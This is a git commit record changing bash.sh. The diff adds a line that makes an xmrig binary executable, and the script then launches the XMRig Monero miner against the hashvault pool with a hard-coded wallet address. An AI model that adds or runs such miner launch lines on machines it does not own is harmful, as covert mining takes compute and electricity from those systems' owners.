8f453b1a49a8ab122eb6ff438121441e8adff1e4
Daisy <71977928+anhbtit80@users.noreply.github.com>
2025-04-14 15:58:03 +0700

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -1,1 +1,3 @@
+chmod +x xmrig
+
 ./xmrig -o pool.hashvault.pro:443 -u 458wDBqXmANaEQRqEeBEU474xigR2u6gkchgPMxeQMtFJTjpdhfFKTA2GZV3VCSTW2ieU8hTSnnwQ2rz1arMjXm231CL8CL -p x --huge-pages-jit --randomx-1gb-pages --tls
